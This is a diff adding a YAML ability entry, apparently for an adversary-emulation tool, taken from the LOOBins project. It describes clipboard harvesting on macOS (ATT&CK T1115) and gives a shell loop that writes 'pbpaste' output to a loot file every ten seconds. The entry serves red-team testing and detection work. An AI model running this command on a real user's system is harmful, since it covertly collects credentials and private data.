@@ -1,0 +1,29 @@
+- id: a60a7c31-008a-c2ca-74a0-c88673656dad
+  name: pbpaste - Use pbpaste to collect sensitive clipboard data
+  description: A pbpaste bash loop can continously collect clipboard contents every x minutes and write
+    contents to a file (or another location). This may allow an attacker to gather user credentials or
+    collect other sensitive information.
+  tactic: credential-access
+  technique:
+    attack_id: T1115
+    name: Clipboard Data
+  platforms:
+    darwin:
+      sh:
+        command: while true; do echo $(pbpaste) >> loot.txt; sleep 10; done
+  singleton: false
+  privilege: User
+  repeatable: true
+  delete_payload: true
+  buckets:
+  - loobins
+  - pbpaste
+  - credential-access
+  version: '1.0'
+  author: LOOBins Project
+  additional_info:
+    loobins_tool: pbpaste
+    use_case: Use pbpaste to collect sensitive clipboard data
+    source_file: pbpaste.yml
+    source_repository: https://github.com/infosecB/LOOBins
+    import_timestamp: '2025-06-24T09:00:11.490620Z'
